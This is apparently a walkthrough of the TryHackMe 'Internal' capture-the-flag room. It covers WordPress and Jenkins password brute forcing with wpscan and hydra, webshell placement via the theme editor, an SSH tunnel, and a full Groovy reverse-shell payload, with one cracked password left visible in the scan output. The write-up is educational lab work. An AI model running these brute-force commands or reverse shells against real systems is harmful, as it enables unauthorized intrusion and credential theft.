##Internal
Scope of Work

The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Ensure that you modify your hosts file to reflect internal.thm
    Any tools or techniques are permitted in this engagement
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope

#Enumeration
```
# Nmap 7.91 scan initiated Fri May 14 11:30:39 2021 as: nmap -sCV -oN nmap/initial -vvv -p 22,80 10.10.4.119
Nmap scan report for internal.thm (10.10.4.119)
Host is up, received echo-reply ttl 61 (0.15s latency).
Scanned at 2021-05-14 11:30:40 PDT for 12s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzpZTvmUlaHPpKH8X2SHMndoS+GsVlbhABHJt4TN/nKUSYeFEHbNzutQnj+DrUEwNMauqaWCY7vNeYguQUXLx4LM5ukMEC8IuJo0rcuKNmlyYrgBlFws3q2956v8urY7/McCFf5IsItQxurCDyfyU/erO7fO02n2iT5k7Bw2UWf8FPvM9/jahisbkA9/FQKou3mbaSANb5nSrPc7p9FbqKs1vGpFopdUTI2dl4OQ3TkQWNXpvaFl0j1ilRynu5zLr6FetD5WWZXAuCNHNmcRo/aPdoX9JXaPKGCcVywqMM/Qy+gSiiIKvmavX6rYlnRFWEp25EifIPuHQ0s8hSXqx5
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMFOI/P6nqicmk78vSNs4l+vk2+BQ0mBxB1KlJJPCYueaUExTH4Cxkqkpo/zJfZ77MHHDL5nnzTW+TO6e4mDMEw=
|   256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMlxubXGh//FE3OqdyitiEwfA2nNdCtdgLfDQxFHPyY0
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 14 11:30:52 2021 -- 1 IP address (1 host up) scanned in 12.89 seconds
```

#Web Server port 80

A default apache page with nothing interesting in the html code so lets enumerate
```
```

We find a /blog directory that takes us to a wordpress site, we find the login panel at /wp-login.php and try some default admin credentials to no avail so we go ahead and use wpscan as follows to try and find some extra information and then try and crack the admin password
```
# wpscan --url http://internal.thm/blog --passwords /usr/share/wordlists/rockyou.txt --usernames admin

[+] URL: http://internal.thm/blog/ [10.10.4.119]
[+] Started: Fri May 14 11:44:36 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-04-27T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.7
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:04 <=======================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys
Trying admin / princess7 Time: 00:04:50 <                                    > (3885 / 14348277)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: REDACTED

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri May 14 11:49:44 2021
[+] Requests Done: 4026
[+] Cached Requests: 37
[+] Data Sent: 2.036 MB
[+] Data Received: 2.31 MB
[+] Memory used: 260.168 MB
[+] Elapsed time: 00:05:07
```

We were able to crack the password for admin and are informed the admin email registered is admin@internal.thm. Our wpscan also informed us that the theme being used is twentyseventeen so we can navigate to the theme editor and edit the 404.php page to now contain php reverse shell. We set up our listener and navigate to http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php.

#Initial Foothold

We have established a initial foothold as the www-data user but can't really find any escalation vectors through sudo, cronjobs, or SUID binaries. So we do some enumeration and eventually find the following in /opt
```
www-data@internal:/opt$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:REDACTED
```

So we go ahead and use these crendential and are able to ssh as aubreanna

#Root Escalation

We find the user.txt flag in the home directory of aubreanan but can't run sudo and don't find any new SUID binaries. However the follwing file in the home directory gives us some info
```
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```

So there is a internal service running so we go ahead and set up an ssh tunnel to access the service ourselves.
```
# ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```

We can navigate 127.0.0.1:8080 to access the service now and are present a jenkins login panel at 127.0.0.1:8080/login?from=%2F. We go ahead and try some default credentials for admin to no avail so lets try and brute force it with hydra. We note the fields being sent in the request to /j_acegi_security_check; j_username, j_password, and from. We use hydra as follows
```
# hydra -t 64 -l admin -s 8080 -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F:F=Invalid username or password"
```

We successfully find the password and are able to access the admin panel we can referenece the following article, https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6, on how to abuse groovy script on jenkins to send ourselves a reverse shell with the following.
```
String host="IP";
int port=PORT;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Our listener picks up the shell and we are the jenkins user and notice a couple interesting things
```
whoami
jenkins
ls -la
total 84
drwxr-xr-x   1 root root 4096 Aug  3  2020 .
drwxr-xr-x   1 root root 4096 Aug  3  2020 ..
-rwxr-xr-x   1 root root    0 Aug  3  2020 .dockerenv
drwxr-xr-x   1 root root 4096 Aug  3  2020 bin
drwxr-xr-x   2 root root 4096 Sep  8  2019 boot
drwxr-xr-x   5 root root  340 May 14 18:28 dev
drwxr-xr-x   1 root root 4096 Aug  3  2020 etc
drwxr-xr-x   2 root root 4096 Sep  8  2019 home
drwxr-xr-x   1 root root 4096 Jan 30  2020 lib
drwxr-xr-x   2 root root 4096 Jan 30  2020 lib64
drwxr-xr-x   2 root root 4096 Jan 30  2020 media
drwxr-xr-x   2 root root 4096 Jan 30  2020 mnt
drwxr-xr-x   1 root root 4096 Aug  3  2020 opt
dr-xr-xr-x 123 root root    0 May 14 18:28 proc
drwx------   1 root root 4096 Aug  3  2020 root
drwxr-xr-x   3 root root 4096 Jan 30  2020 run
drwxr-xr-x   1 root root 4096 Jul 28  2020 sbin
drwxr-xr-x   2 root root 4096 Jan 30  2020 srv
dr-xr-xr-x  13 root root    0 May 14 19:15 sys
drwxrwxrwt   1 root root 4096 May 14 18:28 tmp
drwxr-xr-x   1 root root 4096 Jan 30  2020 usr
drwxr-xr-x   1 root root 4096 Jul 28  2020 var
cd /home
ls -la
total 8
drwxr-xr-x 2 root root 4096 Sep  8  2019 .
drwxr-xr-x 1 root root 4096 Aug  3  2020 ..
```

Seems like we are in a docker environment so we begin to look around and find the following in /opt
```
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you
need access to the root user account.

root:REDACTED
```

Another repeat of where the credentials were stored for aubreanna except this time for root. Sure enough our credentials work for ssh and we have root access on the actual machine, with the root.txt flag in the /root directory.